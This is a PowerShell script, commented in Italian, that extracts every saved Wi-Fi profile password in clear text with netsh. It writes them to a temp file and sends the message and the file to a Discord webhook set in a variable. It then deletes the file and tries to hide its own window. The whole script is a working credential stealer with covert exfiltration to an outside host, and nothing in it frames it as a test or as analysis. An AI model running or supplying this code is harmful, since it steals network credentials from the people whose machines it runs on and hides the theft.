############################################################################################################################################################
# Estrae le password dei profili Wi-Fi
$wifiProfiles = (netsh wlan show profiles) | 
    Select-String "\:(.+)$" | 
    ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $profileInfo = netsh wlan show profile name="$name" key=clear
        
        # Estrai la password se presente
        $passMatch = $profileInfo | Select-String "Key Content\W+:\s*(.+)$"
        $pass = if ($passMatch) { $passMatch.Matches[0].Groups[1].Value.Trim() } else { "N/A" }
        
        # Crea l'oggetto con nome profilo e password
        [PSCustomObject]@{ 
            PROFILE_NAME = $name
            PASSWORD = $pass 
        }
    }

############################################################################################################################################################
# Crea il messaggio formattato
$message = "**Password Wi-Fi Recuperate**`n`n"
foreach ($profile in $wifiProfiles) {
    $message += "**Profilo:** $($profile.PROFILE_NAME)`n**Password:** $($profile.PASSWORD)`n`n"
}

# Salva temporaneamente in un file
$outputFile = "$env:TEMP\wifi-passwords.txt"
$message | Out-File -FilePath $outputFile -Encoding UTF8

############################################################################################################################################################
# Funzione per caricare su Discord
function Upload-Discord {
    param (
        [string]$file,
        [string]$text
    )

    $Body = @{
        'username' = $env:USERNAME
        'content' = $text
    }

    # Invia il messaggio testuale
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
    catch {
        Write-Output "Errore nell'invio del messaggio: $_"
    }

    # Carica il file
    if (Test-Path $file) {
        try {
            curl.exe -F "file1=@$file" $dc
        }
        catch {
            Write-Output "Errore nell'upload del file: $_"
        }
    }
}

############################################################################################################################################################
# Esegui l'upload su Discord
if (-not [string]::IsNullOrEmpty($dc)) {
    Upload-Discord -file $outputFile -text $message
}

# Pulisci i file temporanei
Remove-Item $outputFile -ErrorAction SilentlyContinue

# Nascondi la finestra di PowerShell dopo l'esecuzione
$Host.UI.RawUI.WindowTitle = ''
$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(0, 0)
